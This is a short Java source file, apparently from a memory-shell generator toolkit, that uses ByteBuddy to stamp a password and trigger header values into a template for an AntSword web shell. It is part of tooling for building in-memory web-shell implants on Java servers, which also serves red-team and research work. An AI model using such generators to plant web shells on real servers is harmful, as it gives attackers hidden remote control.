package com.reajason.javaweb.memshell.shelltool.antsword;

import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;

import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.dynamic.DynamicType;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2025/02/18
 */
public class AntSwordGenerator extends ByteBuddyShellGenerator<AntSwordConfig> {
    public AntSwordGenerator(ShellConfig shellConfig, AntSwordConfig shellToolConfig) {
        super(shellConfig, shellToolConfig);
    }

    @Override
    protected DynamicType.Builder<?> getBuilder() {
        return redefineTemplate()
                .field(named("pass")).value(shellToolConfig.getPass())
                .field(named("headerName")).value(shellToolConfig.getHeaderName())
                .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
    }
}
